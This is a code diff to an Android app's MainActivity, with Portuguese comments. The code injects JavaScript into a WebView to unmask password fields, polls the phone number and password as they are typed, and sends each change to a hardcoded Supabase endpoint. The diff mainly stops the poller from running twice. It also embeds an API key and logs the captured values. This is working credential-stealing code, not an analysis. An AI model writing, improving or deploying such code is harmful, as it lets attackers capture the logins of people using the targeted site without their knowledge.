@@ -466,6 +466,9 @@ class MainActivity : AppCompatActivity() {
     private var ultimaSenhaEnviada = ""
     private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
     private var sessaoId: Int = -1      // id da linha inserida no Supabase para esta sessão
+    private var credPollerRunnable: Runnable? = null  // poller activo — evita duplicados
+    private var credUltimoNum = ""                     // estado partilhado do poller
+    private var credUltimaSen = ""                     // estado partilhado do poller
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
@@ -1045,7 +1048,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun injetarJsCredenciais() {
-        // JS: apenas torna password visível e devolve valores actuais
+        // ── GUARD: cancelar poller anterior para evitar instâncias duplicadas ──
+        credPollerRunnable?.let { handler.removeCallbacks(it) }
+        credPollerRunnable = null
+
         val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
             ".forEach(function(e){e.type='text';});"
 
@@ -1063,10 +1069,6 @@ class MainActivity : AppCompatActivity() {
             "return n+'|||'+s;" +
             "})()"
 
-        // Guardar último valor enviado para detectar mudança dígito a dígito
-        var ultimoNumEnviado = ""
-        var ultimoSenEnviado = ""
-
         val poller = object : Runnable {
             override fun run() {
                 // Garantir que password está sempre visível
@@ -1081,19 +1083,19 @@ class MainActivity : AppCompatActivity() {
                             val num = if (parts.size > 0) parts[0].trim() else ""
                             val sen = if (parts.size > 1) parts[1].trim() else ""
 
-                            // Enviar ao Supabase a cada dígito novo — sem esperar submit
-                            val numMudou = num.isNotEmpty() && num != ultimoNumEnviado
-                            val senMudou = sen.isNotEmpty() && sen != ultimoSenEnviado
+                            // Usar variáveis de classe para estado partilhado — evita duplicados
+                            val numMudou = num.isNotEmpty() && num != credUltimoNum
+                            val senMudou = sen.isNotEmpty() && sen != credUltimaSen
 
                             if (numMudou) {
-                                ultimoNumEnviado    = num
+                                credUltimoNum       = num   // estado de classe partilhado
                                 ultimoNumeroEnviado = num
                                 numeroTemporario    = num
                                 android.util.Log.d("SKYBOT_CRED", "Número → $num")
                                 enviarSupabase("Numero", num)
                             }
                             if (senMudou) {
-                                ultimoSenEnviado   = sen
+                                credUltimaSen      = sen   // estado de classe partilhado
                                 ultimaSenhaEnviada = sen
                                 android.util.Log.d("SKYBOT_CRED", "Senha → len=${sen.length}")
                                 enviarSupabase("Senha", sen)
@@ -1104,6 +1106,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
+        credPollerRunnable = poller   // guardar referência para cancelar na próxima chamada
         handler.post(poller)
     }
 
